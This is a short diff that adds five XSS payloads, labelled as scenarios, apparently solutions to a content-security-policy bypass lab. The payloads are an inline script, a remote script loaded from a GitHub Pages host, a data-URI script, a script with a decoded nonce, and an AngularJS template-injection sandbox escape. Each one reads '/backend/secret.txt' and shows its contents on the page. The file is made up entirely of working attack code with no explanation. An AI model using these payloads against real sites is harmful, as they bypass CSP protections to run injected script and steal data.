@@ -1,0 +1,17 @@
+Scenario 1:
+<script>fetch('/backend/secret.txt').then(response => response.text()).then(data => {document.getElementById('output').innerText = data;});</script>
+
+Scenario 2:
+<script type="text/javascript" src="https://cthanhuit.github.io/xss-script/scripts.js"></script>
+Scenario 3:
+<script src="data:text/javascript,
+fetch('/backend/secret.txt')
+    .then(response => response.text())
+    .then(data => {
+        document.getElementById('output').innerText = data;
+    });"></script>
+Scenario 4:
+nonce phải tự decode
+<script nonce="MjAyNCAwNDoyMw==">fetch('/backend/secret.txt').then(response => response.text()).then(data => {document.getElementById('output').innerText = data;});</script>
+Scenario 5:
+<Script Src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js> </Script><div Ng-App>{{$new.constructor('fetch('/backend/secret.txt').then(response => response.text()).then(data => {document.getElementById('output').innerText = data;});')()}}
